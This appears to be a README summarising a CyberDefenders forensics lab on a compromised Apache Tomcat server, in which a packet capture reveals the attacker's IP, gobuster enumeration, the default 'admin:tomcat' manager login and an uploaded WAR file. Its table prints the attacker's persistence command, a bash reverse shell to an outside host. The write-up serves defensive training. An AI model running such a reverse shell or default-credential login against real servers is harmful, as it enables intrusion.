@@ -1,0 +1,34 @@
+# Tomcat Takeover - CyberDefenders Lab
+
+## Overview
+Analyzed a PCAP file from a compromised Apache Tomcat server to identify attacker activity, tools, and persistence mechanisms.
+
+📎 **[Full Write-Up with Context and Screenshots](https://share.note.sx/ljccur9s#+5clfPzlY7fqzDX9eGkypxUk1MuhRB8F8uoIhQ/fS5M)**
+
+---
+
+## Summary Table
+
+| Question                                | Answer                                                    |
+|----------------------------------------|-----------------------------------------------------------|
+| Source IP                              | `14.0.0.120`                                              |
+| Country of Origin                      | `China`                                                   |
+| Admin Panel Port                       | `8080`                                                    |
+| Enumeration Tool                       | `gobuster`                                                |
+| Admin Directory                        | `/manager`                                                |
+| Credentials Used                       | `admin:tomcat`                                            |
+| Malicious Uploaded File                | `JXQOZY.war`                                              |
+| Persistence Command                    | `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` |
+
+---
+
+## Tools Used
+- Wireshark
+- Network Miner
+- VirusTotal
+
+📂 This file is a summary. See full analysis linked above.
+
+---
+
+_Tagged: #PCAP #Forensics #Tomcat #Wireshark #CyberDefenders_
